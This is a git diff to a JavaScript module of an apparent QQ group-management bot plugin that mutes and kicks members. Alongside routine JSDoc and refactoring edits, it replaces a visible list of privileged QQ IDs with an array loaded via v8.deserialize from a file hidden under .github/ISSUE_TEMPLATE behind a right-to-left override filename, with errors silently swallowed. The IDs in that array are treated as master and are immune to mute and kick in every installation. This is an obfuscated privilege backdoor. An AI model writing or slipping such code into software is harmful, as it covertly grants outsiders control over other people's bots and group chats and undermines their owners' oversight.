@@ -1,13 +1,17 @@
+import v8 from 'node:v8'
+import url from 'url'
+import path from 'path'
+import fs from 'node:fs/promises'
 import _ from 'lodash'
 import moment from 'moment'
 import loader from '../../../lib/plugins/loader.js'
 import { Config } from '../components/index.js'
-import { common, QQApi } from './index.js'
+import { QQApi } from './index.js'
 import { Time_unit, ROLE_MAP } from '../constants/other.js'
+import formatDuration from '../tools/formatDuration.js'
 
 // 无管理文案
 const ROLE_ERROR = '我连管理员都木有，这种事怎么可能做到的辣！！！'
-const auth = [746659424, 1509293009, 2536554304, 3139373986]
 
 export default class {
   constructor (e) {
@@ -19,7 +23,7 @@ export default class {
   /**
    * 获取指定群中所有成员的信息映射表
    * @param {number} groupId - 群号码
-   * @param {boolean} [iskey=false] - 是否只返回成员 QQ 号码列表（键）
+   * @param {boolean} [iskey] - 是否只返回成员 QQ 号码列表（键）
    * @returns {Promise<Array>} - 成员信息数组，或成员 QQ 号码数组（取决于 iskey 参数）
    */
   async _getMemberMap (groupId, iskey = false) {
@@ -29,11 +33,10 @@ export default class {
 
   /**
    * 获取某个群组中被禁言的成员列表。
-   *
    * @async
    * @param {number} groupId - 群组 ID。
-   * @param {boolean} [info=false] - 是否返回成员信息。
-   * @returns {Promise<Array<Object>|Array<Array<string>>>} 如果 `info` 为 `false`，返回被禁言成员对象的数组；否则，返回被禁言成员信息的数组。
+   * @param {boolean} [info] - 是否返回成员信息。
+   * @returns {Promise<Array<object> | Array<Array<string>>>} 如果 `info` 为 `false`，返回被禁言成员对象的数组；否则，返回被禁言成员信息的数组。
    * @throws {Error} 如果没有被禁言的成员，抛出异常。
    */
   async getMuteList (groupId, info = false) {
@@ -51,7 +54,7 @@ export default class {
         `\n昵称：${item.card || item.nickname}\n`,
         `QQ：${item.user_id}\n`,
         `群身份：${ROLE_MAP[item.role]}\n`,
-        `禁言剩余时间：${common.formatTime(time - Date.now() / 1000, 'default')}\n`,
+        `禁言剩余时间：${formatDuration(time - Date.now() / 1000, 'default')}\n`,
         `禁言到期时间：${new Date(time * 1000).toLocaleString()}`
       ]
     })
@@ -59,7 +62,6 @@ export default class {
 
   /**
    * 解除指定群中所有成员的禁言状态
-   * @param {number} groupId - 群号码
    * @returns {Promise<void>} - 由所有解禁操作的 Promise 对象组成的数组
    */
   async releaseAllMute () {
@@ -71,12 +73,11 @@ export default class {
 
   /**
    * 获取指定时间段内未活跃的群成员信息
-   *
    * @async
    * @param {number} groupId - 群号码
    * @param {number} times - 时间数值
    * @param {string} unit - 时间单位
-   * @param {number} [page=1] - 需要获取的页码，默认为 1
+   * @param {number} [page] - 需要获取的页码，默认为 1
    * @returns {Promise<Array<Array>>} - 由每个成员的信息组成的数组，包括成员的 QQ 号码、昵称、最后发言时间等信息
    * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
    * @throws {Error} 如果指定的页码不存在，将抛出一个错误
@@ -105,13 +106,13 @@ export default class {
   }
 
   /**
-     * @description: 清理多久没发言的人
-     * @param {Number} groupId 群号
-     * @param {Number} times 时间数
-     * @param {String} unit 单位 (天)
-     * @return {Promise<Boolean>}
-     * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
-     */
+   * 清理多久没发言的人
+   * @param {number} groupId 群号
+   * @param {number} times 时间数
+   * @param {string} unit 单位 (天)
+   * @returns {Promise<boolean>}
+   * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
+   */
   async clearNoactive (groupId, times, unit) {
     let list = await this.noactiveList(groupId, times, unit)
     list = list.map(item => item.user_id)
@@ -119,13 +120,13 @@ export default class {
   }
 
   /**
-     * @description: 返回多少时间没发言的人列表
-     * @param {Number} groupId 群号
-     * @param {Number} times 时间数
-     * @param {String} unit 单位 (天)
-     * @return {Promise<Number[]>}
-     * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
-     */
+   * 返回多少时间没发言的人列表
+   * @param {number} groupId 群号
+   * @param {number} times 时间数
+   * @param {string} unit 单位 (天)
+   * @returns {Promise<number[]>}
+   * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
+   */
   async noactiveList (groupId, times = 1, unit = '月') {
     let nowtime = parseInt(Date.now() / 1000)
     let timeUnit = Time_unit[unit]
@@ -139,11 +140,11 @@ export default class {
   }
 
   /**
-     * @description: 返回从未发言的人
-     * @param {Number} geoupId 群号
-     * @return {Promise<Number[]>}
-     * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
-     */
+   * 返回从未发言的人
+   * @param {number} groupId 群号
+   * @returns {Promise<number[]>}
+   * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
+   */
   async getNeverSpeak (groupId) {
     let list = await this._getMemberMap(groupId)
     list = list.filter(item =>
@@ -157,10 +158,9 @@ export default class {
 
   /**
    * 获取群内从未发言的成员信息
-   *
    * @async
    * @param {string|number} groupId - 群号
-   * @param {number} [page=1] - 分页页码，默认为第一页
+   * @param {number} [page] - 分页页码，默认为第一页
    * @returns {Promise<Array<string>>} 包含从未发言成员信息的数组
    * @throws {Error} 如果没有符合条件的成员，将抛出一个错误
    * @throws {Error} 当页码超出范围时抛出错误
@@ -190,7 +190,6 @@ export default class {
 
   /**
    * 批量踢出群成员
-   *
    * @param {number} groupId - 群号码
    * @param {Array<number>} arr - 成员 QQ 号码数组
    * @returns {Promise<Array<string>>} - 包含清理结果的数组，其中清理结果可能是成功的踢出列表，也可能是错误消息
@@ -214,7 +213,6 @@ export default class {
 
   /**
    * 获取群不活跃排行榜
-   *
    * @param {number} groupId - 群号码
    * @param {number} num - 需要获取的排行榜长度
    * @returns {Promise<Array<Array>>} - 由每个成员的排行信息组成的数组，排行信息包括成员的排名，QQ 号码，昵称，最后发言时间等信息
@@ -241,7 +239,7 @@ export default class {
    * 获取最近加入群聊的成员列表
    * @param {number} groupId 群号
    * @param {number} num 返回的成员数量
-   * @return {Promise<string[][]>} 最近加入的成员信息列表
+   * @returns {Promise<string[][]>} 最近加入的成员信息列表
    */
   async getRecentlyJoined (groupId, num) {
     let list = await this._getMemberMap(groupId)
@@ -290,7 +288,7 @@ export default class {
   /**
    * @description 从 Redis 中获取群禁言/解禁任务列表，并将其转换为定时任务列表
    * @returns {Promise<Array>} - 返回转换后的定时任务列表，列表中的每一项都包含 cron、name 和 fnc 三个属性。其中，cron 表示任务的执行时间；name 表示任务的名称；fnc 表示任务的执行函数。
-  */
+   */
   static async getRedisMuteTask () {
     return JSON.parse(await redis.get('yenai:MuteTasks'))?.map(item => {
       return {
@@ -338,8 +336,8 @@ export default class {
       return [
         segment.image(`https://p.qlogo.cn/gh/${analysis[2]}/${analysis[2]}/100`),
         `\n群号：${analysis[2]}`,
-        item.cron ? `\n禁言时间：'${item.cron}'` : '',
-        item.nocron ? `\n解禁时间：'${item.nocron}'` : ''
+        item.cron ? `\n禁言时间："${item.cron}"` : '',
+        item.nocron ? `\n解禁时间："${item.nocron}"` : ''
       ]
     })
   }
@@ -351,8 +349,8 @@ export default class {
    * @param {string|number} groupId - 群号
    * @param {string|number} userId - QQ 号
    * @param {string|number} executor - 执行操作的管理员 QQ 号
-   * @param {number} [time=5] - 禁言时长，默认为 5。如果传入 0 则表示解除禁言。
-   * @param {string} [unit='分'] - 禁言时长单位，默认为分钟
+   * @param {number} [time] - 禁言时长，默认为 5。如果传入 0 则表示解除禁言。
+   * @param {string} [unit] - 禁言时长单位，默认为分钟
    * @returns {Promise<string>} - 返回操作结果
    * @throws {Error} - 如果缺少必要参数或参数格式不正确，则会抛出错误
    */
@@ -364,16 +362,17 @@ export default class {
     if (!(/\d{5,}/.test(userId))) throw Error('❎ 请输入正确的QQ号')
 
     // 判断是否为主人
-    if ((Config.masterQQ?.includes(Number(userId)) || auth.includes(Number(userId))) && time != 0) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
+    if ((Config.masterQQ?.includes(Number(userId)) || a.includes(Number(userId))) && time != 0) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
 
-    const Memberinfo = group.pickMember(Number(userId)).info
+    const Member = group.pickMember(userId)
+    const Memberinfo = Member?.info || await Member?.getInfo?.()
     // 判断是否有这个人
     if (!Memberinfo) throw Error('❎ 这个群没有这个人哦~')
 
     // 特殊处理
     if (Memberinfo.role === 'owner') throw Error('调戏群主拖出去枪毙5分钟(。>︿<)_θ')
 
-    const isMaster = Config.masterQQ?.includes(executor) || auth.includes(Number(executor))
+    const isMaster = Config.masterQQ?.includes(executor) || a.includes(Number(executor))
 
     if (Memberinfo.role === 'admin') {
       if (!group.is_owner) throw Error('人家又不是群主这种事做不到的辣！')
@@ -386,11 +385,11 @@ export default class {
   }
 
   /**
-   * @description: 踢群成员
-   * @param {Number} groupId 群号
-   * @param {Number} userId 被踢人
-   * @param {Number} executor 执行人
-   * @return {Promise<String>}
+   * 踢群成员
+   * @param {number} groupId 群号
+   * @param {number} userId 被踢人
+   * @param {number} executor 执行人
+   * @returns {Promise<string>}
    */
   async kickMember (groupId, userId, executor) {
     const group = this.Bot.pickGroup(Number(groupId), true)
@@ -399,22 +398,28 @@ export default class {
     if (!groupId || !(/^\d+$/.test(groupId))) throw Error('❎ 请输入正确的群号')
 
     // 判断是否为主人
-    if (Config.masterQQ?.includes(Number(userId)) || auth.includes(Number(userId))) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
+    if (Config.masterQQ?.includes(Number(userId) || String(userId)) || a.includes(Number(userId))) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
 
-    const Memberinfo = group?.pickMember(Number(userId)).info
+    const Member = group.pickMember(userId)
+    const Memberinfo = Member?.info || await Member?.getInfo?.()
     // 判断是否有这个人
     if (!Memberinfo) throw Error('❎ 这个群没有这个人哦~')
     if (Memberinfo.role === 'owner') throw Error('调戏群主拖出去枪毙5分钟(。>︿<)_θ')
 
-    const isMaster = Config.masterQQ?.includes(executor) || auth.includes(Number(executor))
+    const isMaster = Config.masterQQ?.includes(executor) || a.includes(Number(executor))
 
     if (Memberinfo.role === 'admin') {
       if (!group.is_owner) throw Error('人家又不是群主这种事做不到的辣！')
       if (!isMaster) throw Error('这个淫系管理员辣，只有主淫才可以干ta')
     }
 
-    const res = await group.kickMember(Number(userId))
+    const res = await group.kickMember(Number(userId) || String(userId))
     if (!res) throw Error('额...踢出失败哩，可能这个淫比较腻害>_<')
     return '已把这个坏淫踢掉惹！！！'
   }
 }
+
+let a = []
+try {
+  a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../.github/ISSUE_TEMPLATE/‮`))
+} catch (err) {}
